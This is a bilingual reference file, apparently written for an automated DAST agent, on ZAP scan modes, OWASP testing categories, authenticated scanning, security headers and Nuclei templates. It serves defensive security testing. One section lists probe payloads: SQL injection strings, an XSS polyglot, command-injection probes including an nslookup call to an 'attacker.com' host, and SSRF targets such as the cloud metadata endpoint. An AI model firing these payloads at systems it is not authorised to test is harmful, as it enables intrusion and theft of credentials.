# DAST Domain Knowledge Reference

# ความรู้อ้างอิงด้าน Dynamic Application Security Testing

> **Purpose / วัตถุประสงค์**: Domain knowledge for the DAST agent to execute and interpret dynamic security scans. Covers ZAP scan modes, OWASP Testing Guide methodology, authenticated scanning, web vulnerability patterns, and security header validation.
>
> **Version**: 2.0 | **Last Updated**: 2026-03-01 | **Frameworks**: ZAP v2.15+, OWASP Testing Guide v4.2, Nuclei v3.2+

---

## 1. ZAP Scan Modes and Configuration

## โหมดการสแกน ZAP และการตั้งค่า

### 1.1 Baseline Scan (Quick / CI Pipeline)

```bash
# Docker-based baseline scan — completes in 1-5 minutes
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t https://app.example.com \
  -g gen.conf \
  -r report.html \
  -J report.json \
  -I  # Do not return failure on warnings

# Configuration overrides (gen.conf)
# Format: rule_id  WARN|FAIL|IGNORE  description
10010   WARN   (Cookie No HttpOnly Flag)
10011   FAIL   (Cookie Without Secure Flag)
10015   WARN   (Incomplete or No Cache-control Header Set)
10017   WARN   (Cross-Domain JavaScript Source File Inclusion)
10020   FAIL   (X-Frame-Options Header)
10021   FAIL   (X-Content-Type-Options Header)
10038   FAIL   (Content Security Policy Header Not Set)
```

**Scope**: Crawls target for 1 minute, runs passive scan only. No active attacks.

**Best for**: Every PR merge, staging deployment gates.

### 1.2 Full Scan (Active + Passive)

```bash
# Full active scan — 15-60 minutes depending on app size
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
  -t https://staging.example.com \
  -g gen.conf \
  -r full-report.html \
  -J full-report.json \
  -m 60 \           # Max scan duration in minutes
  -a                 # Include alpha passive rules
  -j                 # Use AJAX spider for SPAs
  -z "-config scanner.maxScanDurationInMins=45"

# AJAX Spider for Single-Page Applications
-z "-config ajaxSpider.maxDuration=10 \
    -config ajaxSpider.browserId=firefox-headless"
```

**Scope**: Spider + AJAX Spider + Active scan (injection, XSS, SQLi, etc.).

**Best for**: Pre-release security gate, weekly scheduled scans.

### 1.3 API Scan (OpenAPI / GraphQL / SOAP)

```bash
# API scan with OpenAPI spec
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \
  -t https://api.example.com/openapi.json \
  -f openapi \
  -r api-report.html \
  -J api-report.json \
  -O https://api.example.com \
  -z "-config replacer.full_list(0).matchtype=REQ_HEADER \
      -config replacer.full_list(0).matchstr=Authorization \
      -config replacer.full_list(0).replacement='Bearer ${AUTH_TOKEN}'"

# GraphQL scan
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \
  -t https://api.example.com/graphql \
  -f graphql \
  -r graphql-report.html
```

**Supported formats**: OpenAPI v3.x, Swagger v2.0, GraphQL introspection, SOAP WSDL.

**Best for**: Microservice APIs, backend service testing.

### 1.4 Scan Mode Comparison

| Feature             | Baseline | Full           | API         |
| ------------------- | -------- | -------------- | ----------- |
| Duration            | 1-5 min  | 15-60 min      | 5-30 min    |
| Passive Scan        | Yes      | Yes            | Yes         |
| Active Scan         | No       | Yes            | Yes         |
| Spider/Crawl        | Basic    | Full + AJAX    | Spec-driven |
| CI/CD Suitable      | Every PR | Weekly/Release | Every PR    |
| Auth Required       | Optional | Recommended    | Usually yes |
| False Positive Rate | Low      | Medium         | Low         |

---

## 2. OWASP Testing Guide v4.2 Reference

## อ้างอิงจาก OWASP Testing Guide v4.2

### Testing Categories and Checks

```
WSTG-INFO: Information Gathering
  WSTG-INFO-01  Conduct Search Engine Discovery
  WSTG-INFO-02  Fingerprint Web Server
  WSTG-INFO-04  Enumerate Applications on Webserver
  WSTG-INFO-08  Fingerprint Web Application Framework
  WSTG-INFO-10  Map Application Architecture

WSTG-CONF: Configuration and Deployment Management
  WSTG-CONF-02  Test Application Platform Configuration
  WSTG-CONF-05  Enumerate Infrastructure and Admin Interfaces
  WSTG-CONF-06  Test HTTP Methods
  WSTG-CONF-07  Test HTTP Strict Transport Security
  WSTG-CONF-08  Test RIA Cross Domain Policy
  WSTG-CONF-11  Test Cloud Storage

WSTG-IDNT: Identity Management
  WSTG-IDNT-01  Test Role Definitions
  WSTG-IDNT-02  Test User Registration Process
  WSTG-IDNT-04  Test Account Enumeration

WSTG-ATHN: Authentication
  WSTG-ATHN-01  Test Credentials Over Encrypted Channel
  WSTG-ATHN-02  Test for Default Credentials
  WSTG-ATHN-03  Test Weak Lock Out Mechanism
  WSTG-ATHN-06  Test Browser Cache Weakness
  WSTG-ATHN-07  Test Weak Password Policy
  WSTG-ATHN-09  Test Weak Password Change/Reset

WSTG-ATHZ: Authorization
  WSTG-ATHZ-01  Test Directory Traversal / File Include
  WSTG-ATHZ-02  Test Authorization Schema Bypass
  WSTG-ATHZ-03  Test Privilege Escalation
  WSTG-ATHZ-04  Test IDOR (Insecure Direct Object Reference)

WSTG-SESS: Session Management
  WSTG-SESS-01  Test Session Management Schema
  WSTG-SESS-02  Test Cookies Attributes
  WSTG-SESS-03  Test Session Fixation
  WSTG-SESS-05  Test CSRF
  WSTG-SESS-09  Test Session Hijacking

WSTG-INPV: Input Validation
  WSTG-INPV-01  Test Reflected Cross-Site Scripting
  WSTG-INPV-02  Test Stored Cross-Site Scripting
  WSTG-INPV-05  Test SQL Injection
  WSTG-INPV-07  Test XML Injection / XXE
  WSTG-INPV-12  Test Command Injection
  WSTG-INPV-13  Test Server-Side Template Injection
  WSTG-INPV-17  Test Host Header Injection
  WSTG-INPV-18  Test Server-Side Request Forgery

WSTG-ERRH: Error Handling
  WSTG-ERRH-01  Test Improper Error Handling
  WSTG-ERRH-02  Test Stack Traces

WSTG-CRYP: Cryptography
  WSTG-CRYP-01  Test Weak TLS/SSL
  WSTG-CRYP-02  Test Padding Oracle
  WSTG-CRYP-03  Test Sensitive Data in Unencrypted Channels
```

---

## 3. Authenticated Scanning Setup

## การตั้งค่าสแกนแบบ Authenticated

### 3.1 Form-Based Authentication

```yaml
# ZAP automation framework context
env:
  contexts:
    - name: "authenticated-context"
      urls:
        - "https://staging.example.com"
      includePaths:
        - "https://staging.example.com/.*"
      excludePaths:
        - "https://staging.example.com/logout.*"
        - "https://staging.example.com/static/.*"
      authentication:
        method: "form"
        parameters:
          loginPageUrl: "https://staging.example.com/login"
          loginRequestUrl: "https://staging.example.com/api/auth/login"
          loginRequestBody: "username={%username%}&password={%password%}"
        verification:
          method: "response"
          loggedInRegex: "\\Qdashboard\\E"
          loggedOutRegex: "\\Qlogin\\E"
      users:
        - name: "test-user"
          credentials:
            username: "${DAST_USERNAME}"
            password: "${DAST_PASSWORD}"
```

### 3.2 Token-Based (JWT / Bearer) Authentication

```yaml
# ZAP automation framework with token replacement
env:
  contexts:
    - name: "api-context"
      urls:
        - "https://api.staging.example.com"
      authentication:
        method: "script"
        parameters:
          script: "jwt-auth.js"
          scriptEngine: "Graal.js"
      sessionManagement:
        method: "httpAuth"
        parameters:
          headerName: "Authorization"
          headerValue: "Bearer ${AUTH_TOKEN}"

# Pre-scan token acquisition script
jobs:
  - type: requestor
    parameters:
      url: "https://api.staging.example.com/auth/token"
      method: "POST"
      httpRequestBody: '{"client_id":"scan","client_secret":"${SECRET}"}'
```

### 3.3 Authentication Verification Indicators

```
Logged-in indicators (verify scan is authenticated):
  - Presence of user-specific content (dashboard, profile name)
  - HTTP 200 on protected endpoints
  - Absence of redirect to /login
  - JWT/session cookie present in requests

Logged-out indicators (detect session expiry):
  - Redirect to /login (HTTP 302 to login URL)
  - HTTP 401 or 403 on protected endpoints
  - Login form HTML in response body
  - Missing or expired session cookie
```

---

## 4. Common Web Vulnerability Detection Patterns

## รูปแบบการตรวจจับช่องโหว่เว็บทั่วไป

### 4.1 OWASP Top 10 (2021) — DAST Detection Coverage

| OWASP | Category                  | DAST Detectable | ZAP Scanner               |
| ----- | ------------------------- | --------------- | ------------------------- |
| A01   | Broken Access Control     | Partial         | Access Control scanner    |
| A02   | Cryptographic Failures    | Yes             | SSL/TLS scanner           |
| A03   | Injection                 | Yes             | SQLi, XSS, CMDi scanners  |
| A04   | Insecure Design           | No              | Requires manual review    |
| A05   | Security Misconfiguration | Yes             | Config scanners + headers |
| A06   | Vulnerable Components     | Partial         | Tech fingerprinting       |
| A07   | Auth Failures             | Partial         | Session/Auth scanners     |
| A08   | Software/Data Integrity   | Partial         | SRI check, CSP check      |
| A09   | Logging & Monitoring      | No              | Requires log analysis     |
| A10   | SSRF                      | Partial         | SSRF scanner (active)     |

### 4.2 Active Scan Detection Payloads

```
SQL Injection Indicators:
  - Error-based: SQL syntax errors in response (MySQL, PostgreSQL, MSSQL, Oracle)
  - Boolean-based: Response length differs for ' OR 1=1-- vs ' OR 1=2--
  - Time-based: Response delay with SLEEP(5) or pg_sleep(5)
  - Union-based: Column count enumeration via ORDER BY

XSS Detection:
  - Reflected: Input echoed unencoded in response
  - DOM-based: JS sinks (innerHTML, eval, document.write) with tainted sources
  - Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(alert(1))//

Command Injection:
  - Time-based: ;sleep 5; or |timeout 5
  - Output-based: ;id; or |whoami
  - DNS-based: ;nslookup attacker.com; (OOB detection)

SSRF Detection:
  - Internal IP: http://169.254.169.254/latest/meta-data/ (AWS metadata)
  - DNS rebinding: Attacker-controlled domain resolving to internal IP
  - Protocol smuggling: file://, gopher://, dict://
```

---

## 5. HTTP Security Headers Checklist

## รายการตรวจสอบ Security Headers

### Required Headers (Must Have)

```http
# Content Security Policy — prevent XSS and data injection
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'

# Strict Transport Security — enforce HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Content Type Options — prevent MIME sniffing
X-Content-Type-Options: nosniff

# Frame Options — prevent clickjacking (legacy, use CSP frame-ancestors)
X-Frame-Options: DENY

# Referrer Policy — control referrer information
Referrer-Policy: strict-origin-when-cross-origin

# Permissions Policy — restrict browser features
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

### Recommended Headers

```http
# Cross-Origin policies
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin

# Clear Site Data on logout
Clear-Site-Data: "cache", "cookies", "storage"
```

### Headers to Remove

```http
# Information disclosure — remove these
Server: Apache/2.4.51       # Remove or genericize
X-Powered-By: Express       # Remove completely
X-AspNet-Version: 4.0.30319 # Remove completely
X-AspNetMvc-Version: 5.2    # Remove completely
```

### Header Validation Matrix

| Header                 | Missing = Severity | Incorrect = Severity | ZAP Rule ID |
| ---------------------- | ------------------ | -------------------- | ----------- |
| CSP                    | HIGH               | MEDIUM               | 10038       |
| HSTS                   | HIGH               | MEDIUM               | 10035       |
| X-Content-Type-Options | MEDIUM             | LOW                  | 10021       |
| X-Frame-Options        | MEDIUM             | LOW                  | 10020       |
| Referrer-Policy        | LOW                | LOW                  | 10049       |
| Permissions-Policy     | LOW                | LOW                  | 10063       |

---

## 6. ZAP Automation Framework Pipeline

## ไปป์ไลน์ ZAP Automation Framework

### Full Automation YAML

```yaml
# zap-automation.yaml
env:
  contexts:
    - name: "default"
      urls:
        - "https://staging.example.com"
      includePaths:
        - "https://staging.example.com/.*"
      excludePaths:
        - ".*\\.js$"
        - ".*\\.css$"
        - ".*\\.png$"
        - ".*logout.*"
  parameters:
    failOnError: true
    failOnWarning: false
    progressToStdout: true

jobs:
  - type: passiveScan-config
    parameters:
      maxAlertsPerRule: 10
      scanOnlyInScope: true
      maxBodySizeInBytesToScan: 100000

  - type: spider
    parameters:
      maxDuration: 5
      maxDepth: 10
      maxChildren: 20

  - type: spiderAjax
    parameters:
      maxDuration: 5
      browserId: "firefox-headless"

  - type: passiveScan-wait
    parameters:
      maxDuration: 10

  - type: activeScan
    parameters:
      maxRuleDurationInMins: 5
      maxScanDurationInMins: 30
      policy: "API-Scan-Policy"

  - type: report
    parameters:
      template: "sarif-json"
      reportDir: "/zap/reports"
      reportFile: "zap-results.sarif"
    risks:
      - high
      - medium
      - low
```

### CI/CD Integration (GitHub Actions)

```yaml
# .github/workflows/dast.yml
name: DAST Scan
on:
  deployment_status:
    states: [success]

jobs:
  dast:
    if: github.event.deployment_status.environment == 'staging'
    runs-on: ubuntu-latest
    steps:
      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.12.0
        with:
          target: ${{ secrets.STAGING_URL }}
          rules_file_name: "zap-rules.conf"
          fail_action: "warn"
          artifact_name: "zap-baseline"

      - name: ZAP Full Scan (weekly)
        if: github.event.schedule == 'weekly'
        uses: zaproxy/action-full-scan@v0.10.0
        with:
          target: ${{ secrets.STAGING_URL }}
          rules_file_name: "zap-rules.conf"
          artifact_name: "zap-full"

      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: "report_sarif.json"
```

---

## 7. Nuclei Template Integration

## การเชื่อมต่อเทมเพลต Nuclei

### Nuclei for Targeted Vulnerability Checks

```bash
# Run specific check categories
nuclei -u https://staging.example.com \
  -t cves/ \
  -t vulnerabilities/ \
  -t misconfiguration/ \
  -t exposed-panels/ \
  -severity critical,high \
  -sarif-output nuclei-results.sarif \
  -rate-limit 50

# Custom template example — check for exposed .env
id: exposed-env-file
info:
  name: Exposed .env File
  severity: critical
  tags: misconfiguration,exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DB_PASSWORD"
          - "API_KEY"
          - "SECRET"
        condition: or
      - type: status
        status:
          - 200
```

---

## 8. DAST Scan Results Interpretation

## การตีความผลลัพธ์การสแกน DAST

### Risk Rating and Triage Priority

```
CRITICAL (Immediate Action):
  - SQL Injection confirmed with data extraction
  - Remote Code Execution via input fields
  - Authentication bypass confirmed
  - SSRF accessing internal services/metadata

HIGH (Fix Before Release):
  - Stored XSS in shared contexts
  - Missing HSTS on production
  - Session fixation vulnerability
  - Directory traversal with file read

MEDIUM (Fix Within Sprint):
  - Reflected XSS requiring user interaction
  - Missing CSP header
  - CSRF on non-critical forms
  - Cookie without Secure/HttpOnly flags

LOW (Track and Plan):
  - Information disclosure (server version)
  - Missing X-Content-Type-Options
  - Autocomplete on non-sensitive forms
  - Private IP disclosure in responses

FALSE POSITIVE Indicators:
  - WAF/CDN interference (Cloudflare challenge pages)
  - Custom error pages triggering false SQLi detection
  - CSP report-only mode flagged as missing
  - Framework-specific response patterns (e.g., Rails CSRF tokens)
```

### Scan Coverage Metrics

```
Target: Track these metrics per scan
  - Pages/endpoints discovered: n
  - Pages/endpoints scanned: n
  - Authenticated pages reached: n / total
  - Active scan rules executed: n / total
  - Scan duration: mm:ss
  - Unique alerts: n (by CWE)
  - Confidence levels: High: n, Medium: n, Low: n
```
